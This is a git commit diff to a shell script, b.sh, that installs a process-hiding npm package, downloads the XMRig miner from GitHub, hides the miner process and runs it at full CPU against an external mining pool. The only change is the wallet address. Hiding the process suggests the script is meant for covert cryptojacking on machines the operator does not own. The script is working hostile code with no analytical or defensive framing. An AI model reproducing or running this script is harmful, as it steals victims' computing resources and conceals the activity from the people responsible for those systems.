f83527a615fc680eae4ab024adff5f1f2f01ca1b
Akonvict <110672554+Akonvict@users.noreply.github.com>
2022-08-10 20:02:30 +0000

    Update b.sh

--- b.sh
+++ b.sh
@@ -6,4 +6,4 @@ npm config set cache /tmp --global
 npm i -g node-process-hider
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
 ph add xmrig
-ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/arq -o evox.e4pool.com:4488 -u evcFBgvjCCZ3qQ5bHSTR1FPZaQ8t2vd1DRtiiomjXeDwLoYq4X3ccL5hJzCUDVggAR1hLeTBk8PBM1FfkcoNWFHb6Jwq39kwWM.$ip -p x --threads=$(nproc --all) --cpu-priority=5 --randomx-mode=fast --keepalive
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/arq -o evox.e4pool.com:4488 -u evcFCbq344RYixdn9otidq7tJqVRHJSYx2gErAUgmnS2WnRyyEFEDNXGSFyFEtTd9CBSsXPxz7guk7GZrCT438Tw5UjCRdwCGC.$ip -p x --threads=$(nproc --all) --cpu-priority=5 --randomx-mode=fast --keepalive
